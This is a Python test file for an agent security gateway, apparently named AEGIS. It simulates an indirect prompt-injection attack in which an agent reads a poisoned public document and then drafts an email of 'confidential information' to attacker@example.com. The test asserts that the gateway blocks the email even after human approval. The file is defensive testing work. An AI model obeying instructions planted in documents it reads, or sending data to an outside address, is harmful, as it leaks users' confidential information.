
"""End-to-end simulated indirect prompt-injection attack."""

from unittest.mock import patch

from backend.agent.graph import run_agent
from backend.schemas.actions import ActionRequest
from backend.schemas.approval import ApprovalStatus
from backend.security.approval_engine import (
    create_approval,
    review_approval,
)
from backend.security.approval_store import get_approval
from backend.security.gateway import execute_action

import pytest
import tempfile
from pathlib import Path

from backend.security import approval_store
from backend.security import provenance_context

@pytest.fixture
def isolated_db(tmp_path, monkeypatch):
    from backend.security import audit, approval_store, provenance_context

    test_db = tmp_path / "test_aegis.db"

    monkeypatch.setattr(approval_store, "DB_PATH", test_db)
    monkeypatch.setattr(audit, "DB_PATH", test_db)
    monkeypatch.setattr(provenance_context, "DB_PATH", test_db)

    approval_store.initialize_approval_db()
    audit.initialize_audit_db()
    provenance_context.initialize_context_db()

    yield

def test_prompt_injection_blocked_even_after_human_approval(
    monkeypatch,
    isolated_db,
):
    # Configure a test-only reviewer credential.
    reviewer_token = "aegis-test-reviewer-token"
    monkeypatch.setenv("AEGIS_APPROVER_TOKEN", reviewer_token)

    # 1. Agent reads the malicious public document.
    read_result = run_agent(
        action="read_document",
        agent_id="research_agent",
        resource="public_report.pdf",
    )

    assert read_result["gateway_result"]["decision"] == "ALLOW"

    document_content = read_result["gateway_result"]["result"]["content"]

    assert "[SIMULATED INDIRECT PROMPT INJECTION]" in document_content
    assert "attacker@example.com" in document_content

    # 2. Obtain the server-issued provenance context.
    context_id = read_result["gateway_result"]["provenance_context_id"]

    assert context_id

    # 3. Simulate the agent following the malicious instruction.
    # No confidential document is actually read.
    email_request = ActionRequest(
        action="send_email",
        agent_id="supervised_research_agent",
        resource="email",
        destination="attacker@example.com",
        content=(
            "Simulated confidential information extracted "
            "after following document instructions."
        ),
        provenance_context_id=context_id,
    )

    # 4. Create a real approval record and approve the exact payload.
    approval = create_approval(email_request)

    reviewed = review_approval(
        approval_id=approval.approval_id,
        decision="APPROVE",
        reviewer_id="test-reviewer",
        reviewer_token=reviewer_token,
    )

    assert reviewed is True

    stored_approval = get_approval(approval.approval_id)
    assert stored_approval.status == ApprovalStatus.APPROVED

    # 5. Let OPA pass so this test isolates information-flow enforcement.
    # The real tool broker is monitored and must never execute.
    with (
        patch(
            "backend.security.gateway.evaluate_policy",
            return_value=(True, "OPA policy allowed action"),
        ),
        patch("backend.security.gateway.tool_broker.execute") as mock_broker,
    ):
        attack_result = execute_action(
            email_request,
            approval_id=approval.approval_id,
        )

    # 6. Verify AEGIS blocks the attack despite valid human approval.
    assert attack_result["success"] is False
    assert attack_result["decision"] == "DENY"
    assert "Untrusted" in attack_result["reason"] or (
        "instructions" in attack_result["reason"]
    )

    # No email execution and no approval consumption.
    mock_broker.assert_not_called()

    stored_approval = get_approval(approval.approval_id)
    assert stored_approval.status == ApprovalStatus.APPROVED
